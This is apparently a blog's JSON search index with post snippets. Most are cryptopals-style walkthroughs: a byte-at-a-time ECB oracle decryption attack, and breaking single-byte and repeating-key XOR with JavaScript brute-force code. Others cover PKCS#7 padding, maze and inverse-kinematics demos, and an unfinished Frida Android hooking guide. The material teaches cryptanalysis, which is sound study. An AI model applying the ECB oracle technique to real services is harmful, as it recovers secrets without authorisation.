[ { "title": "Cryptography - Byte by Byte ECB Decryption", "url": "/posts/cryptography-byte-by-byte-ecb-decryption/", "categories": "security, cryptography", "tags": "security, cryptography, cipher, encryption, decryption, algorithm, tools", "date": "2021-12-12 19:50:23 +1100", "snippet": "In this post we’ll cover how to attack an oracle function that encrypts user supplied data concatenated with an unknown string under ECB mode while using a constant but unknown key.This post will assume you know what PKCS#7 padding is. If you’re unsure what this is, you can read my short post about it here.This post is also a solution to challenge 12 on the cryptopals website. This site is a great resource for hands on learning about cryptography. The technique used to complete this challenge is outlined on that page. This post will explain the same technique with a bit more detail and visual examples. What are we Breaking Attack SummaryWhat are we BreakingFor a more concrete example of what we are breaking, imagine the oracle function is a web server API such as: POST /encryptThis API would take a single parameter which is the message we want to encrypt, and would return the cipher-text. Because the key used by the server remains constant, sending the same message results in the same response.Example Request This is my message I want encryptedExample Response (HEX) 3b600a3994308f1d53879432125635deb10485748eefc86905180ff82f9a73c235b09a4c89e30328094effe8d2282edb9e2d3ccf364ba758e1395f1fcebbedc1Behind the scenes the server is doing the following: Concatenating the user supplied string with an unknown string (like a salt), and encrypting it with a random but constant key. AES-ECB(user-string || unknown-string, random-key) The resulting encrypted data is sent back to the user.My claim is that we can determine exactly what unknown-string is by repeated calls to this oracle function without ever knowing the encryption key!Attack SummaryStep 1 - Block SizeThe first piece of information we require is the block size, since encryption modes like ECB and CBC encrypt blocks of a fixed length. The cryptopals challenge uses AES, so we already know the block size is 16 bytes, but we’ll assume we don’t know that. The below visual examples will use a block size of 8 bytes, since it fits on the screen better. The technique is exactly the same for all block sizes.Working out the block size is very simple, we just need to do the following: Create a message 1 byte in length. Send the message to the oracle function, and store the cipher-text length. Increase the message size by 1 byte, and send the message to the oracle function. Repeat the previous step until the length of the cipher-text changes. The block size will be the final size minus the original size.Step 1 - Visual ExampleExample Configuration: The server is using a unknown string that is 13 bytes long (marked as XX since we don’t know what it is). We’ll use the byte 0x41 as our message, which is actually the letter A. This is arbitrary, and you can use any byte you like. After the user string is concatenated with the unknown string, the message is padded using PKCS#7 to make sure the length is a multiple of block size.Message 1 (1 Byte Message) 41 XX XX XX XX XX XX XX XX XX XX XX XX XX 02 02 After being encrypted and returned, the length would be 16 bytes, which we store as the starting size. We add another message byte and repeat.Message 2 (2 Byte Message) 41 41 XX XX XX XX XX XX XX XX XX XX XX XX XX 01 The response is still 16 bytes long, so we add another message byte and repeat.Message 3 (3 Byte Message) 41 41 41 XX XX XX XX XX XX XX XX XX XX XX XX XX 08 08 08 08 08 08 08 08 The response size has increased to 24 bytes. We now stop, and subtract the current size from the starting size to find the block size.Block Size = 24 - 16Block Size = 8 bytesStep 2 - Unknown String SizeThis part is trivial now that we have determined the block size in the last step. We don’t even have to send anymore messages to work this out.The first message we sent was 1 byte long, and the response was 16 bytes long. This means the unknown string is guaranteed to be less than 16 bytes long.We kept adding bytes to our message until the next block is added. Recall that in PKCS#7 padding, an entire block of padding is added when the plain-text length is a multiple of the block size. Look at Message 3 above, the plain-text (user-string || unknown-string) exactly filled 2 blocksBecause of this, we now know: length(user-string) + length(unknown-string) = 16 bytes length(unknown-string) = 16 bytes - length(user-string) length(unknown-string) = 16 bytes - 3 bytes length(unknown-string) = 13 bytesThe 16 bytes comes from the response length in Message 1. The 3 bytes comes from the length of our message when the response size increased.Perfect, with just a little Math we know the length of the unknown string is 13 bytes!Now let’s get to decrypting what unknown string is.Step 3 - Determining the Unknown StringOur first step to finding the unknown string is to create a piece of plain-text that is bigger than the unknown string.Since the unknown string is 13 bytes long, we’ll add enough extra bytes until it’s a multiple of the block size. Our plain-text will be 16 bytes long, since 16 is a multiple of 8 (block size), and is bigger than 13 (unknown string size).The message we’ll send is 16 repeated bytes (we’ll use 0x41 again). If we send said message to the server, we know that it would look like this after the unknown string and padding is added: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 XX XX XX XX XX XX XX XX XX XX XX XX XX 03 03 03 The only block of plain-text and cipher-text we’ll really be looking at is what block number the final block of plain-text is. Since we sent 2 blocks of plain-text, we’ll only be interested in the 2nd block of cipher-text. If we had sent 30 blocks of plain-text, we’d only focus on the 30th block of cipher-text.Okay, now the fun stuff. Observe what we happen if we were to remove a single byte of our message. The first byte of the unknown string is now the last byte in block 2 (the highlighted row): 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 XX XX XX XX XX XX XX XX XX XX XX XX XX 04 04 04 04 How do we determine what that unknown byte is? By brute force!A byte can only be 256 possible values. So we’ll send 256 messages, each with a different value in the final position of block 2.Message 1 would look like this: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 00 XX XX XX XX XX XX XX XX XX XX XX XX XX 03 03 03 Message 2 would look like this: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 01 XX XX XX XX XX XX XX XX XX XX XX XX XX 03 03 03 …Message 256 would look like this: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 FF XX XX XX XX XX XX XX XX XX XX XX XX XX 03 03 03 For each of the 256 messages, we store the cipher-text value of block 2 (the highlighted row) along with the byte that was added in a lookup table.Now let’s send the earlier message with 1 byte less than a full block: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 XX XX XX XX XX XX XX XX XX XX XX XX XX 04 04 04 04 We can now get the cipher-text value of block 2, perform a lookup in our table, and see what byte is required to produce said cipher-text. It turns out it was 0x53.We’ve just discovered the first byte of the unknown string, let’s find more!Step 4 - Determining the Unknown String ContinuedWe’ve found the first byte, 1 down, 12 to go. We just need to rinse and repeat.For the second byte, we first remove another byte of our message so that the first two bytes of the unknown string are in block 2: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 53 XX XX XX XX XX XX XX XX XX XX XX XX 05 05 05 05 05 Since we know the first byte of the unknown string, there are again only 256 possible values for the final byte. So let’s brute force again and create another lookup table. From now on we’ll be appending the recovered unknown string bytes to the end of our plain-text when doing the brute forcing. 41 41 41 41 41 41 41 41 41 41 41 41 41 41 53 00 XX XX XX XX XX XX XX XX XX XX XX XX XX 03 03 03 41 41 41 41 41 41 41 41 41 41 41 41 41 41 53 01 XX XX XX XX XX XX XX XX XX XX XX XX XX 03 03 03 With the new lookup table built, we can send our plain-text message (with no unknown string bytes added), extract block 2 of the cipher-text, and perform a lookup to see what byte produced that cipher-text: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 53 XX XX XX XX XX XX XX XX XX XX XX XX 05 05 05 05 05 It turns out the second byte was 0x65.Awesome, 2 bytes down 11 to go. This step is just rinse and repeat until all the unknown string bytes are found.Finishing UpAfter repeating Step 4 eleven more times, we’ve found our unknown string. It turns out it was SecretStuff@1.Some final notes: We recovered this string without knowledge of the encryption key. This attack was not on the underlying cipher, it was against the cipher mode. AES is just as vulnerable to this attack as DES. This attack scales linearly O(N) and takes (256 * N) oracle function calls to complete, where N is the length of the unknown string. This could be lowered if you assumed/guessed the unknown string is only printable ASCII chars. Checkout the cryptopals website if you want to solve more problems like this and learn more about cryptography." }, { "title": "Cryptography - Breaking Repeating Key XOR Encryption", "url": "/posts/cryptography-breaking-repeating-xor-key-encryption/", "categories": "security, cryptography", "tags": "security, cryptography, cipher, encryption, decryption, algorithm, tools", "date": "2021-12-11 08:24:02 +1100", "snippet": "In this post we’ll cover how to decrypt messages that have been XOR encrypted using a repeated key, such as 84 d2 7a 09. The method we’ll be using to break the encryption uses statistics (letter frequencies and use of common words, bigrams, and trigrams), so the cipher-text needs to be a decent size otherwise it won’t work. The key used can be any arbitrary number of bytes long, but in general, the shorter the easy it is to break.This technique requires you to know how to break single byte XOR encryption. If you’re unsure how to do that, please see my post about it here.This post is also a solution to challenge 6 on the cryptopals website. This site is a great resource for hands on learning about cryptography. The technique used to complete this challenge is outlined on that page. This post will explain the same technique with a bit more detail and visual examples. Repeating Key XOR Encryption Example Summary How to Break it - Step 1 How to Break it - Step 2 How to Break it - Step 3 ResultsRepeating Key XOR Encryption ExampleKey (4 Byte Length) 84 d2 7a 09 Plain-TextThis is the HEX representation of “ABCDEFGH”: 41 42 43 44 45 46 47 48 EncryptionXOR the Plain-Text with key 41 ⊕ 84 42 ⊕ d2 43 ⊕ 7a 44 ⊕ 09 45 ⊕ 84 46 ⊕ d2 47 ⊕ 7a 48 ⊕ 09 Cipher-Text c5 90 39 4d c1 94 3d 41 SummaryAs previously mentioned, we’ll use statistics to break the encryption. Because of this, very short cipher-texts such as the example above will not be able to be broken using this method.The steps we’ll use to break the encryption are as follows: Find the key length, we’ll call this length KEYSIZE. Split the cipher-text into KEYSIZE length sections, and create KEYSIZE different blocks where block 1 contains the 1st byte of every section, block 2 contains the 2nd byte of every section etc. Find the key for each block by performing single byte key XOR decryption.Let’s get into some more detail on each step.How to Break it - Step 1To find the key length, we’ll use some brute force and statistics. We don’t know the KEYSIZE, so we’ll guess that it’s from between 2 and 40 bytes long.For each KEYSIZE we’ll take the first KEYSIZE worth of bytes, and the second KEYSIZE worth of bytes and find the hamming distance between them. We’ll then normalise this value by dividing by KEYSIZE. This should be repeated multiple times and the average taken. That is, do the same process with the second KEYSIZE worth of bytes, and the third KEYSIZE worth of bytes. Then the 3rd and 4th, 4th and 5th etc.The KEYSIZE with the lowest normalised hamming distance should be the KEYSIZE.Let’s show an example for a KEYSIZE of 2. Below is the first 8 bytes of cipher-text: 1d 42 1f 4d 0b 0f 02 1f We need to find the hamming distance between block 1 0x1d42 and block 2 0x1f4d, which is 5. We then need to divide this by KEYSIZE to normalise it. So we are left with 5/2 = 2.5.We repeat this with block 2 0x1f4d and block 3 0x0b0f, which is 4. 4/2 = 2.Then again with block 3 0x0b0f and block 4 0x021f, which is 3. 3/2 = 1.5.We can repeat this as many times as we like if we have more cipher-text. Since we did it 3 times above, we need to add the 3 results together and divide by 3 to get the average hamming distance:(2.5 + 2 + 1.5) / 3 = 2We have completed the step for a KEYSIZE of 2. We need to repeat all of this for each KEYSIZE (2-40).The KEYSIZE with the lowest normalised hamming distance should be correct, but it’s not guaranteed. We’ll take the top performing KEYSIZEs and continue with the next step.How to Break it - Step 2We’ll now convert the problem into a series of single byte XOR encryption problems. Here’s how to do that.Let’s say that after Step 1 we think the KEYSIZE is 5. We’ll split the cipher-text into KEYSIZE length sections, and then we’ll create KEYSIZE number of blocks.The first byte of each section goes into block 1. The second byte of each section goes into block 2. The third byte of each section goes into block 3 etc.Here is how that would look visually with the first 16 bytes of cipher-text: 1d 42 1f 4d 0b 0f 02 1f 4f 13 4e 3c 1a 69 65 1f Block 1 (1st byte of each section) 1d 0f 4e 1f Block 2 (2nd byte of each section) 42 02 3c Block 3 (3rd byte of each section) 1f 1f 1a Block 4 (4th byte of each section) 4d 4f 69 Block 5 (5th byte of each section) 0b 13 65 We’re now ready to find the key.How to Break it - Step 3For each of the blocks in Step 2, we’ll break them as if they are single byte key XOR encrypted, which if we have the right KEYSIZE, they are. After doing so, let’s say we get the following results: Block 1 Key = 69 Block 2 Key = 20 Block 3 Key = 69 Block 4 Key = 6e Block 5 Key = 69Our final decryption key would be the concatenation of all these, so it would be 69 20 69 6e 69.Back at the end of Step 1 we said we didn’t know for sure what the KEYSIZE was, only that we had a good idea. For each of the best performing KEYSIZEs, we do Step 2 &amp;amp; 3. This will give a decryption key for each of the KEYSIZEs.To find out which one is most likely to be correct, we decrypt the cipher-text using each decryption key, then score the results based on how English it is. Scoring English was covered in the breaking single byte XOR key encryption, and the exact same method is used here.And that’s all there is to it! You now know how to break repeated key XOR encryption. As a side note, Step 1 isn’t technically necessary as it only serves to reduce the amount of computation done in the subsequent steps.ResultsUsing this exact technique on the challenge cipher-text yielded the following results.The best performing KEYSIZEs were: KEYSIZE of 2 (Hamming Distance: 2) KEYSIZE of 3 (Hamming Distance: 2.66) KEYSIZE of 29 (Hamming Distance: 2.79) KEYSIZE of 5 (Hamming Distance: 2.79) KEYSIZE of 18 (Hamming Distance: 2.94)English scores after doing Steps 2 &amp;amp; 3 with each of the above KEYSIZEs: KEYSIZE of 29 (English Score: 4782) KEYSIZE of 18 (English Score: 1768) KEYSIZE of 2 (English Score: 1727) KEYSIZE of 5 (English Score: 1697) KEYSIZE of 3 (English Score: 1670)A KEYSIZE of 29 was clearly the winner when it came to English scoring. Here is that decrypted cipher-text using the discovered 29 byte key:[+] Best Key Length: 29[+] Key: &amp;lt;Buffer 54 65 72 6d 69 6e 61 74 6f 72 20 58 3a 20 42 72 69 6e 67 20 74 68 65 20 6e 6f 69 73 65&amp;gt;I&#39;m back and I&#39;m ringin&#39; the bellA rockin&#39; on the mike while the fly girls yellIn ecstasy in the back of meWell that&#39;s my DJ Deshay cuttin&#39; all them Z&#39;sHittin&#39; hard and the girlies goin&#39; crazyVanilla&#39;s on the mike, man I&#39;m not lazy.I&#39;m lettin&#39; my drug kick inIt controls my mouth and I beginTo just let it flow, let my concepts goMy posse&#39;s to the side yellin&#39;, Go Vanilla Go!Smooth &#39;cause that&#39;s the way I will beAnd if you don&#39;t give a damn, thenWhy you starin&#39; at meSo get off &#39;cause I control the stageThere&#39;s no dissin&#39; allowedI&#39;m in my own phaseThe girlies sa y they love me and that is okAnd I can dance better than any kid n&#39; playStage 2 -- Yea the one ya&#39; wanna listen toIt&#39;s off my head so let the beat play throughSo I can funk it up and make it sound good1-2-3 Yo -- Knock on some woodFor good luck, I like my rhymes atrociousSupercalafragilisticexpialidociousI&#39;m an effect and that you can betI can take a fly girl and make her wet.I&#39;m like Samson -- Samson to DelilahThere&#39;s no denyin&#39;, You can try to hangBut you&#39;ll keep tryin&#39; to get my styleOver and over, practice makes perfectBut not if you&#39;re a loafer.You&#39;ll get nowhere, no place, no time, no girlsSoon -- Oh my God, homebody, you probably eatSpaghetti with a spoon! Come on and say it!VIP. Vanilla Ice yep, yep, I&#39;m comin&#39; hard like a rhinoIntoxicating so you stagger like a winoSo punks stop trying and girl stop cryin&#39;Vanilla Ice is sellin&#39; and you people are buyin&#39;&#39;Cause why the freaks are jockin&#39; like Crazy GlueMovin&#39; and groovin&#39; trying to sing alongAll through the ghetto groovin&#39; this here songNow you&#39;re amazed by the VIP posse.Steppin&#39; so hard like a German NaziStartled by the bases hittin&#39; groundThere&#39;s no trippin&#39; on mine, I&#39;m just gettin&#39; downSparkamatic, I&#39;m hangin&#39; tight like a fanaticYou trapped me once and I thought thatYou might have itSo step down and lend me your ear&#39;89 in my time! You, &#39;90 is my year.You&#39;re weakenin&#39; fast, YO! and I can tell itYour body&#39;s gettin&#39; hot, so, so I can smell itSo don&#39;t be mad and don&#39;t be sad&#39;Cause the lyrics belong to ICE, You can call me DadYou&#39;re pitchin&#39; a fit, so step back and endureLet the witch doctor, Ice, do the dance to cureSo come up close and don&#39;t be squareYou wanna battle me -- Anytime, anywhereYou thought that I was weak, Boy, you&#39;re dead wrongSo come on, everybody and sing this songSay -- Play that funky music Say, go white boy, go white boy goplay that funky music Go white boy, go white boy, goLay down and boogie and play that funky music till you die.Play that funky music Come on, Come on, let me hearPlay that funky music white boy you say it, say itPlay that funky music A little louder nowPlay that funky music, white boy Come on, Come on, Come onPlay that funky music" }, { "title": "Cryptography - Breaking Single Byte XOR Encryption", "url": "/posts/cryptography-breaking-single-byte-xor-encryption/", "categories": "security, cryptography", "tags": "security, cryptography, cipher, encryption, decryption, algorithm, tools", "date": "2021-12-06 08:24:02 +1100", "snippet": "In this post we’ll cover how to decrypt messages that have been XOR encrypted using a single byte key, such as b7. While this might not sound that useful, it’s a pre-cursor to breaking XOR encryption that uses a repeating key, such as 84 d2 7a 09 4c.This post is also a solution to challenge 3 on the cryptopals website. This site is a great resource for hands on learning about cryptography. The technique used to complete this challenge is outlined on that page. This post will explain the same technique with a bit more detail and examples. How to Break it English Scoring Brute Forcing the Key What Next?How to Break itSince the key is only a single byte, the keyspace is very small, only 256 possible keys. As such, brute force is practical and reasonable solution.We still need to determine which key is actually correct though. We’re assuming that the plain-text we are recovering is English text. After attempting decryption with a key, we’ll need a method to “score” the decrypted data based on how English it is.English ScoringLet’s start off by writing a function that can score a String based on how English it is.We’ll give a String points for the following: +2 Points for each occurrence of the 6 most common English characters (and space) +1 Point for each occurrence of the next 6 most common English characters +1 Point for each occurrence of the 20 most common English Bigrams +1 Point for each occurrence of the 20 most common English Trigrams +1 Point for each occurrence of the 298 most common English WordsThe String’s score will be the sum of these points.// Source: https://preply.com/en/blog/300-most-common-english-words/let commonEnglishWords = `is,be,do,go,am,he,an,up,so,no,of,to,in,on,at,by,it,he,we,my,me,us,as,or,if,was,are,had,can,use,has,see,did,get,may,say,set,put,ask,try,add,saw,got,run,eat,let,cut,way,day,man,boy,end,men,air,eye,car,sea,one,all,two,new,old,any,big,own,few,not,how,out,now,too,why,off,far,for,you,his,she,her,him,who,its,our,and,but,have,were,said,will,make,like,look,been,call,find,come,made,take,know,live,give,help,tell,came,want,show,does,must,went,read,need,move,play,keep,turn,seem,open,walk,grow,took,hear,stop,miss,talk,word,time,part,work,year,back,name,line,farm,land,home,hand,page,food,tree,city,head,life,side,feet,mile,book,idea,face,girl,list,song,each,many,some,more,long,most,good,mean,same,even,such,kind,high,left,next,hard,both,four,when,then,only,very,just,much,also,well,here,away,near,last,once,soon,with,from,into,down,over,that,they,this,what,your,them,than,it’s,would,write,could,think,spell,found,study,learn,start,might,close,begin,began,carry,watch,being,leave,water,sound,place,thing,house,point,world,plant,earth,story,paper,group,night,river,state,other,great,right,three,small,large,still,every,light,white,above,young,there,first,where,again,below,never,often,later,about,after,under,along,until,which,their,these,those,while,don’t,follow,change,should,number,people,animal,letter,mother,answer,school,father,Indian,family,little,second,enough,before,around,always,really,almost,thought,picture,America,country,example,another,through,between,without,because,sentence,children,mountain,together,different,important,sometimes,something`;commonEnglishWords = commonEnglishWords.split(&#39;,&#39;).map(word =&amp;gt; Buffer.from(word, &#39;utf-8&#39;));// Source: https://www3.nd.edu/~busiforc/handouts/cryptography/Letter%20Frequencies.htmllet mostCommonEnglishLettersPrimary = new Map();let mostCommonEnglishLettersSecondary = new Map();&#39;etaoin &#39;.split(&#39;&#39;).forEach(char =&amp;gt; mostCommonEnglishLettersPrimary.set(char.charCodeAt(), true));&#39;shrdlu&#39;.split(&#39;&#39;).forEach(char =&amp;gt; mostCommonEnglishLettersSecondary.set(char.charCodeAt(), true));// Source: https://www3.nd.edu/~busiforc/handouts/cryptography/Letter%20Frequencies.htmllet commonEnglishBigrams = `th,he,in,er,an,re,nd,on,en,at,ou,ed,ha,to,or,it,is,hi,es,ng`;let commonEnglishTrigrams = `the,and,ing,her,hat,his,tha,ere,for,ent,ion,ter,was,you,ith,ver,all,wit,thi,tio`;commonEnglishBigrams = commonEnglishBigrams.split(&#39;,&#39;).map(word =&amp;gt; Buffer.from(word, &#39;utf-8&#39;));commonEnglishTrigrams = commonEnglishTrigrams.split(&#39;,&#39;).map(word =&amp;gt; Buffer.from(word, &#39;utf-8&#39;));// Returns an positive Integer score based on how English the input Buffer isconst scoreDecryptedBuffer = (decipheredBuffer) =&amp;gt; { let commonWordMatches = 0; let commonBigramMatches = 0; let commonTrigramMatches = 0; let commonLetterMatches = 0; // Detect how many occurrences of the most common English Words there are. commonEnglishWords.forEach(commonWord =&amp;gt; { commonWordMatches += countOccurrences(decipheredBuffer, commonWord); }); // Detect how many occurrences of the most common English Bigrams there are. commonEnglishBigrams.forEach(commonBigram =&amp;gt; { commonBigramMatches += countOccurrences(decipheredBuffer, commonBigram); }); // Detect how many occurrences of the most common English Trigrams there are. commonEnglishTrigrams.forEach(commonTrigram =&amp;gt; { commonTrigramMatches += countOccurrences(decipheredBuffer, commonTrigram); }); // Detect how many occurrences of the most common English letters there are. // The 6 most common letters (and space) get +2 score, the next 6 most common get +1 score. decipheredBuffer.forEach(byte =&amp;gt; { if (mostCommonEnglishLettersPrimary.has(byte)) commonLetterMatches += 2; else if (mostCommonEnglishLettersSecondary.has(byte)) commonLetterMatches += 1; }); return commonWordMatches + commonBigramMatches + commonTrigramMatches + commonLetterMatches;}// Count how many occurrences of a Buffer occur within a target Bufferconst countOccurrences = (targetBuffer, toSearchForBuffer) =&amp;gt; { let occurrences = 0; let currentOccurrenceIndex = targetBuffer.indexOf(toSearchForBuffer); while (currentOccurrenceIndex !== -1) { occurrences++; currentOccurrenceIndex = targetBuffer.indexOf(toSearchForBuffer, currentOccurrenceIndex+1); } return occurrences;}Scoring Examplelet englishText = Buffer.from(&#39;This is a test string that will be scored on how english it is&#39;, &#39;utf-8&#39;);let randomBytes = [];for (let i = 0; i &amp;lt; 64; ++i) { randomBytes.push(Math.floor(Math.random()*256));}console.log(&#39;Score for English Text:&#39;, scoreDecryptedBuffer(englishText));console.log(&#39;Score for Random Bytes:&#39;, scoreDecryptedBuffer(Buffer.from(randomBytes)));Score for English Text: 129Score for Random Bytes: 4Brute Forcing the KeyNow that we can score a given String on how English it is, we can brute force the key.As the key is only one byte, there is 256 possible keys to check. For each key we will decrypt the cipher-text with it, and score the decrypted string. The key that produces the best score is most likely to be the correct key.// Perform single byte XOR decryption on a given Cipher-Text Bufferconst singleXorKeyDecryption = (cipherTextBuffer) =&amp;gt; { let bestScore = { score: 0, key: -1 }; let decryptionBuffer = Buffer.alloc(cipherTextBuffer.length); let tempScore; // Brute force all 256 possible keys for (decryptionKey = 0; decryptionKey &amp;lt; 256; ++decryptionKey) { // Decrypt the Cipher-Text using the current decryption key and store results in the decryption Buffer for (let i = 0; i &amp;lt; cipherTextBuffer.length; ++i) { decryptionBuffer[i] = cipherTextBuffer[i] ^ decryptionKey; } // Score the decrypted Cipher-Text tempScore = scoreDecryptedBuffer(decryptionBuffer); // If this key scored best, store it if (tempScore &amp;gt; bestScore.score) { bestScore.score = tempScore; bestScore.key = decryptionKey; } } // Decrypt the Cipher-Text using the best scoring decryption key and store results in the decryption Buffer for (let i = 0; i &amp;lt; cipherTextBuffer.length; ++i) { decryptionBuffer[i] = cipherTextBuffer[i] ^ bestScore.key; } // Return the best key, and the Cipher-Text decrypted with that key return { data: decryptionBuffer, key: bestScore.key, score: bestScore.score };}With this latest function we can call it with our cipher-text as input. The cipher-text used is from here.let cipherText = Buffer.from(&#39;1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736&#39;, &#39;hex&#39;);let decryptionResults = singleXorKeyDecryption(cipherText);console.log(&#39;\\nMost Likely Decryption Key:&#39;);console.log(Buffer.from([decryptionResults.key]));console.log(&#39;\\nDecrypted Data:&#39;);console.log(decryptionResults.data);console.log(decryptionResults.data.toString(&#39;utf-8&#39;));Putting everything together, we can now decrypt our cipher-text:Most Likely Decryption Key:&amp;lt;Buffer 58&amp;gt;Decrypted Data:&amp;lt;Buffer 43 6f 6f 6b 69 6e 67 20 4d 43 27 73 20 6c 69 6b 65 20 61 20 70 6f 75 6e 64 20 6f 66 20 62 61 63 6f 6e&amp;gt;Cooking MC&#39;s like a pound of baconWhat Next?While this function might not seem that useful at first, it will be vital when we want to break repeating key XOR encryption.If you want to learn how to do that, you can read how to here." }, { "title": "Cryptography - PKCS#7 Padding", "url": "/posts/cryptography-pkcs-7-padding/", "categories": "security, cryptography", "tags": "security, cryptography, encryption, decryption, algorithm, pkcs", "date": "2021-12-03 01:06:44 +1100", "snippet": "This post will show how PKCS#7 Padding works for block ciphers like DES and AES. This post includes visual examples and the edge case to be aware of. PKCS#7, which includes message padding, is defined in RFC 5652. What It’s For Examples Edge CaseWhat It’s ForPadding is used in certain block cipher modes (like ECB and CBC) when the plain-text needs to be a multiple of the block size. If we are using a 16 byte block cipher, but our plain-text is only 9 bytes, then we need to pad out our data with 7 additional bytes.To do this we append 7 bytes all with the value of 0x07. The general case is if we need to add N bytes to make a full block, we append N bytes each with a value of N. This works only if the block size is less than 256 bytes, since a byte can only be a value between 0 and 255. See examples below for 8 byte blocks:ExamplesExample 1Before Padding (3 Bytes) 58 b3 a9 After Padding (8 Bytes) 58 b3 a9 05 05 05 05 05 Example 2Before Padding (14 Bytes) c3 07 4b b2 b4 9f 5b a9 a6 0b 51 30 6d 2c After Padding (16 Bytes) c3 07 4b b2 b4 9f 5b a9 a6 0b 51 30 6d 2c 02 02 Edge CaseThe edge case to be aware of is when the plain-text length is a multiple of the block size. I.e. if the block size is 8, and the plain-text is of size 8, 16, 24, etc. In this case, padding still needs to be added to avoid confusion.If no padding was added, and the plain-text ends with 02 02 or 01, that data would be striped away as it would look like padding.If the plain-text is a multiple of the block size B, then another block is added that contains the value B in all positions. Example below with a block size of 8:Before Padding (8 Bytes) 58 b3 a9 32 07 8c fd 19 After Padding (16 Bytes) 58 b3 a9 32 07 8c fd 19 08 08 08 08 08 08 08 08 " }, { "title": "BaseN Converter", "url": "/posts/basen-converter/", "categories": "tools", "tags": "tools, security, cryptography, algorithm, cipher", "date": "2021-11-30 19:22:14 +1100", "snippet": "This tool can convert from UTF-8 strings to BaseN (any arbitrary base). It can also convert from BaseN to UTF-8 or HEX. The conversion alphabet can also be specified for these conversions as well. For example, when you convert ASCII to HEX, the output is made up of alphabet 0123456789abcdef. But if we like we can specify the output alphabet to be Gb$&amp;amp;c@=+9521ocx~. This would mean that the HEX char 0 will be represented as a G, the HEX char 1 will be a b, 2 will be $, and so on.As always, be VERY careful when pasting encoded data into arbitrary websites! Encoded strings could contain any kind of data, including passwords and tokens, and therefore must be treated as confidential.ALL processing on this website is done client-side. However, this may not be case with other sites.NOTE using 64 as the base, will NOT give the same results as traditional Base64. If you are unsure why this is the case, you can read how traditional Base64 works here.ModeEncodeDecodeBaseInputConversion AlphabetOutput UTF-8 HEX" }, { "title": "Maze Colouring with DFS and BFS", "url": "/posts/maze-colouring-with-dfs-and-bfs/", "categories": "javascript, programming", "tags": "javascript, programming, p5.js, algorithm, maze, fun", "date": "2021-11-07 23:29:48 +1100", "snippet": "Maze colouring using BFS (Breadth-First Search) and DFS (Depth-First Search). For reference, the mazes in the below examples were generated using the Randomized Depth-First Search (Recursive Backtracking) and Aldous-Broder algorithms. What are we Doing? Colour Gradient Small Static Example Bigger Static Example DFS (Depth-First Search) Animation BFS (Breadth-First Search) Animation Aldous-Broder Maze GenerationWhat are we Doing?This post will visually demonstrate the difference of traversing through a maze using the BFS and DFS search methods. This post already assumes you know what both these methods are.Colour GradientWe’ll use the below colour gradient to show how far away cells are from the origin. The hue value of the cell will be scaled from 0 to 300, where 0 is the closest, and 300 is the furthest. Closest Furthest AwaySmall Static ExampleThe below maze is an example what we start with:We then choose a random cell to be the starting point, then calculate how far away every cell in the maze is. We then colour the cell based on its distance using the colour gradient above.Bigger Static ExampleIf we increase the size of the maze, and remove the walls so the colours come through, we can get some interesting looking patterns:DFS (Depth-First Search) AnimationThe aboves images may look cool, but they don’t show any difference regarding the algorithm used (BFS or DFS). We need to see an animation of the construction to see the difference.The following two videos will demonstrate the DFS traversal method. These mazes were generated using the Recursive Backtracking method. Now on a bigger maze with no walls: BFS (Breadth-First Search) AnimationThe following two videos will demonstrate the BFS traversal method. These mazes were generated using the Recursive Backtracking method. Now on a bigger maze with no walls: Aldous-Broder Maze GenerationRecall that a spanning tree of a undirected graph is a tree that connects all the vertices of the graph, but contains no cycles. Each maze is one possible spanning tree of all the vertices in the graph.All the previous mazes were generated using the Recursive Backtracking method. Mazes generated using this method tend to have long paths with less dead ends.The Aldous-Broder method is different as it has a equal chance of generating each possible spanning tree (maze). The two mazes below were generated with this method. Now on a bigger maze with no walls: " }, { "title": "FABRIK Algorithm", "url": "/posts/fabrik-algorithm/", "categories": "javascript, programming", "tags": "javascript, programming, p5.js, algorithm, plexus, fun", "date": "2021-11-04 19:35:22 +1100", "snippet": "In this post we’ll look at how to implement the FABRIK algorithm in 2D in JavaScript using the p5.js library for drawing. The Forward And Backward Reaching Inverse Kinematics (FABRIK) algorithm is a heuristic, iterative solver for the Inverse Kinematics problems. What is the Goal? Starting Configuration End Configuration The Algorithm Step 1 Step 2 Step 3 Full Single Iteration Second Iteration CompletedWhat is the Goal?Given a set of nodes that are connected together, we want to know how they should move when the end node is moved.Starting Configuration The Blue Node is our fixed starting point. The Green Node is position where we want to move the end (left most) Node.End ConfigurationThis is our end goal configuration which we want to calculate:The AlgorithmThe algorithm is iterative, so we will repeatable be doing the same steps until we reach our desired result. The steps of the algorithm are as follows: Move the first point desired location. Move the next point towards the previous so that it’s the correct distance away. Repeat Step 2 until all points are processed.The above steps are a single iteration. Once a single iteration is complete, we do it again, but in the reverse order. So the point we finished on will be the starting point in the next iteration.Step 1Move the first point to the desired location (the Green Node):Starting configurationMoving Point 1 to target location (Green Node)Step 2Move the next point towards the previous (in this case the first node) so it’s the correct distance away:Moving Point 2 towards Point 1Step 3Repeat Step 2 until all points are processed:Moving Point 3 towards Point 2Moving Point 4 towards Point 3ITERATION COMPLETEFull Single IterationSecond IterationNotice that the order of the points has been reversedMoving Point 1 to target location (Blue Node)Moving Point 2 towards Point 1Moving Point 3 towards Point 2Moving Point 4 towards Point 3ITERATION COMPLETECompletedAfter performing 20 iterations (10 each way) we have the following result:References https://www.sciencedirect.com/science/article/abs/pii/S1524070311000178?via%3Dihub https://en.wikipedia.org/wiki/Inverse_kinematics https://p5js.org/" }, { "title": "Android Hooking in Frida", "url": "/posts/android-hooking-in-frida/", "categories": "security, mobile", "tags": "security, mobile, android, frida, programming, javascript", "date": "2021-10-30 01:19:01 +1100", "snippet": "NOT COMPLETED, STILL UNDER CONSTRUCTIONIntro guide on how to use Frida to hook Android applications at runtime to inject code and override methods. This guide already assumes you have frida installed and have frida-server installed on your android device. Basic Android Hooking Class Methods - WebView URL Script Breakdown Dealing with Types Class Constructors Creating Objects Already Created Objects WebView DevTools Hooking Strings toString Methods String Equals Basic Android HookingClass Methods - WebView URLThe following code will show how to hook a Method in a class and set the implementation to the custom code we define.We’ll create a new file called webview.js and put the following code:Java.perform(function() { let Webview = 